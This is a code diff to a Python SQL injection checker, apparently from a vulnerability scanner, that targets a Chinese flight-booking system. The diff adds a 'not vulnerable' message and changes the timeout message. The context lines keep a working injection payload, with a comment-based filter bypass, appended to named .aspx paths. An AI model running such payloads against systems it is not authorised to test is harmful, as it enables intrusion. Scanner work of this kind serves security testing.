@@ -26,14 +26,18 @@ class piaoyou_six2_sqli_BaseVerify:
                 "/Visa/visa_edit.aspx?id=1",
                 "/Visa/gjqz_add.aspx?id=214"]
         try:
+            noexist = True
             for url in urls:
                 vulnurl = self.url + url + "AnD/**/1=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))--"
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     cprint("[+]存在票友机票预订系统SQL注入漏洞(绕过)...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在piaoyou_six2_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
